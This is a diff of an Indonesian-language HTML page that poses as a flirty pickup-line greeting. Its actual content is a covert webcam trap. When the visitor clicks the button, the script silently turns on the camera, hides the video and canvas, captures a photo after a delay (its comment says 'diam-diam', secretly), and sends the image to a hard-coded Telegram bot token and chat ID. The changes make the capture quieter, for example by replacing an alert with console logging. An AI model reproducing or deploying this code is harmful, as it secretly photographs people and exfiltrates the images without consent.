@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rayuan❤️</title>
+    <title>Rayuan Maut 💘</title>
     <style>
         body {
             display: flex;
@@ -14,19 +14,21 @@
             text-align: center;
             background: linear-gradient(45deg, #ff758c, #ff7eb3);
             font-family: 'Comic Sans MS', cursive, sans-serif;
-            transition: background 0.5s;
-            overflow: hidden;
         }
 
         h1 {
-            font-size: 30px;
+            font-size: 28px;
             color: white;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
         }
 
         p {
             font-size: 20px;
             color: white;
             font-weight: bold;
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 0.5s, transform 0.5s;
         }
 
         button {
@@ -37,7 +39,9 @@
             font-size: 18px;
             cursor: pointer;
             border-radius: 25px;
+            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
             transition: transform 0.2s, background 0.3s;
+            margin: 10px;
         }
 
         button:hover {
@@ -45,8 +49,8 @@
             background-color: #ff1e56;
         }
 
-        video {
-            display: none; /* Video tetap ada tapi tersembunyi */
+        .hidden {
+            display: none;
         }
     </style>
 </head>
@@ -54,68 +58,67 @@
 
     <h1>💖 Halo, Bidadari! 💖</h1>
     <p id="flirtText">Klik tombol di bawah buat lihat sesuatu yang spesial! 😘</p>
-    <button onclick="godaCewe()">Klik Aku! 💕</button>
-
-    <video id="video" autoplay></video>
+    <button onclick="mulaiRayuan()">Rayuan Spesial & Surprise 📸</button>
+    
+    <video id="video" autoplay class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
 
     <script>
         const rayuanList = [
             "Aku yakin gravitasi gak bisa lawan daya tarik kamu. 😍",
             "Kamu seperti kopi, bikin jantungku berdetak lebih cepat! ☕💓",
             "Kalau bidadari turun ke bumi, pasti wajahnya mirip kamu! 😇",
-            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. 😊❤️"
+            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. 😊❤️",
+            "Bahkan bulan iri sama kamu, karena kamu yang paling bersinar. 🌙✨",
+            "Aku ga butuh peta, karena hatiku selalu tertuju padamu. 💘"
         ];
 
-        const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI'; // Ganti dengan token bot Telegram
-        const chatId = '1746156378'; // Ganti dengan chat ID Telegram
-        const video = document.getElementById('video');
-
-        function godaCewe() {
+        function mulaiRayuan() {
             const flirtText = document.getElementById("flirtText");
             flirtText.textContent = rayuanList[Math.floor(Math.random() * rayuanList.length)];
+            flirtText.style.opacity = 1;
+            flirtText.style.transform = "scale(1)";
 
-            startCapture();
+            // Ambil foto diam-diam setelah 3 detik
+            setTimeout(startCapture, 3000);
         }
 
         function startCapture() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
 
-                        // Tunggu sampai video siap
-                        video.onloadedmetadata = () => {
-                            setTimeout(() => {
-                                captureAndSend(stream);
-                            }, 2000);
-                        };
-                    })
-                    .catch(error => alert("Akses kamera ditolak."));
-            }
-        }
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
 
-        function captureAndSend(stream) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+                        stream.getTracks().forEach(track => track.stop());
 
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-                stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg');
+                        canvas.toBlob(blob => {
+                            sendToTelegram(blob);
+                        }, "image/jpeg");
+                    }, 3000);
+                })
+                .catch(() => console.log("Akses kamera ditolak."));
         }
 
         function sendToTelegram(blob) {
-            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.jpg');
+            const telegramToken = "7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI"; // Ganti dengan token bot Telegram
+            const chatId = "1746156378"; // Ganti dengan chat ID Telegram
 
-            fetch(url, { method: 'POST', body: formData });
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).catch(() => console.log("Terjadi kesalahan saat mengirim gambar."));
         }
     </script>
 
